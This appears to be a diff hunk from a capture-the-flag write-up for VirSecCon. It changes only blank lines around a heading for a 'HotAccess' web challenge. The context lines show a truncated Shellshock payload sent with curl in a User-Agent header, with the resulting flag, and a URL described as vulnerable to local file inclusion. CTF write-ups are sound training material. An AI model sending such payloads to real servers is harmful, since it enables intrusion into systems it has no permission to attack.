@@ -135,7 +135,8 @@ yas3r@linux[~/CTF/VirSecCon]$ curl -H "user-agent: () { :; }; echo; echo; /bin/b
 LLS{woah_dude_radical_shellshock}
 ```
 
- ### HotAccess : Web Challenge
+
+### HotAccess : Web Challenge
 
 This challenge is introduction to `LFI` but we need to find the hidden flag, the following url is vulnerable to `lfi` : `http://jh2i.com:50016/index.php?m=`
 
